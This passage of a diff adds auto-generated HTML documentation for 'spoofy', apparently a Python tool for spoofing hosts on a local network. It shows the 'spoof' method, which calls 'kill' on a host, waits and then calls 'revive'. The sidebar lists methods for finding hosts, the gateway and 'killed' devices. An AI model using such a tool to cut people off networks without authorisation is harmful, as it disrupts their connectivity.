+    &#34;&#34;&#34;
+    Run method in thread to avoid blocking.
+
+    Intended for Network.kill() and Network.revive().
+    &#34;&#34;&#34;
+    thread = Thread(target=fn, args=args, kwargs=kwargs)
+    thread.start()
+    return thread</code></pre>
+</details>
+</dd>
+<dt id="spoofy.network.Network.spoof"><code class="name flex">
+<span>def <span class="ident">spoof</span></span>(<span>host)</span>
+</code></dt>
+<dd>
+<div class="desc"><p>Spoof and un-spoof host with 'WAIT_DURATION' in Settings.</p>
+<h2 id="parameter">Parameter</h2>
+<p>host &ndash; (dictionary) host fetched from cls.get</p></div>
+<details class="source">
+<summary>
+<span>Expand source code</span>
+</summary>
+<pre><code class="python">@classmethod
+def spoof(cls, host):
+    &#34;&#34;&#34;
+    Spoof and un-spoof host with &#39;WAIT_DURATION&#39; in Settings.
+
+    Parameter:
+        host -- (dictionary) host fetched from cls.get
+    &#34;&#34;&#34;
+    cls.kill(host)
+    sleep(Settings.get[&#39;WAIT_DURATION&#39;])
+    cls.revive(host)</code></pre>
+</details>
+</dd>
+<dt id="spoofy.network.Network.tag_vendor"><code class="name flex">
+<span>def <span class="ident">tag_vendor</span></span>(<span>vendor)</span>
+</code></dt>
+<dd>
+<div class="desc"><p>Tag matched vendor.</p>
+<p>Return extended name.</p>
+<h2 id="parameter">Parameter</h2>
+<p>vendor &ndash; (string) manufacturer</p></div>
+<details class="source">
+<summary>
+<span>Expand source code</span>
+</summary>
+<pre><code class="python">@classmethod
+def tag_vendor(cls, vendor):
+    &#34;&#34;&#34;
+    Tag matched vendor.
+
+    Return extended name.
+
+    Parameter:
+        vendor -- (string) manufacturer
+    &#34;&#34;&#34;
+    tagged = vendor
+    if (vendor in cls.__vendor_tags):
+        tagged = f&#34;{vendor} ({cls.__vendor_tags[vendor]})&#34;
+    return tagged</code></pre>
+</details>
+</dd>
+</dl>
+</dd>
+</dl>
+</section>
+</article>
+<nav id="sidebar">
+<h1>Index</h1>
+<div class="toc">
+<ul></ul>
+</div>
+<ul id="index">
+<li><h3>Super-module</h3>
+<ul>
+<li><code><a title="spoofy" href="index.html">spoofy</a></code></li>
+</ul>
+</li>
+<li><h3><a href="#header-classes">Classes</a></h3>
+<ul>
+<li>
+<h4><code><a title="spoofy.network.Network" href="#spoofy.network.Network">Network</a></code></h4>
+<ul class="two-column">
+<li><code><a title="spoofy.network.Network.cleanup" href="#spoofy.network.Network.cleanup">cleanup</a></code></li>
+<li><code><a title="spoofy.network.Network.get" href="#spoofy.network.Network.get">get</a></code></li>
+<li><code><a title="spoofy.network.Network.get_gateway" href="#spoofy.network.Network.get_gateway">get_gateway</a></code></li>
+<li><code><a title="spoofy.network.Network.get_hosts" href="#spoofy.network.Network.get_hosts">get_hosts</a></code></li>
+<li><code><a title="spoofy.network.Network.get_interface" href="#spoofy.network.Network.get_interface">get_interface</a></code></li>
+<li><code><a title="spoofy.network.Network.get_killed" href="#spoofy.network.Network.get_killed">get_killed</a></code></li>
+<li><code><a title="spoofy.network.Network.get_netmask" href="#spoofy.network.Network.get_netmask">get_netmask</a></code></li>
+<li><code><a title="spoofy.network.Network.initialize" href="#spoofy.network.Network.initialize">initialize</a></code></li>
+<li><code><a title="spoofy.network.Network.kill" href="#spoofy.network.Network.kill">kill</a></code></li>
+<li><code><a title="spoofy.network.Network.revive" href="#spoofy.network.Network.revive">revive</a></code></li>
+<li><code><a title="spoofy.network.Network.spoof" href="#spoofy.network.Network.spoof">spoof</a></code></li>
+<li><code><a title="spoofy.network.Network.tag_vendor" href="#spoofy.network.Network.tag_vendor">tag_vendor</a></code></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</nav>
+</main>
+<footer id="footer">
+<p>Generated by <a href="https://pdoc3.github.io/pdoc" title="pdoc: Python API documentation generator"><cite>pdoc</cite> 0.10.0</a>.</p>
+</footer>
+</body>
+</html>
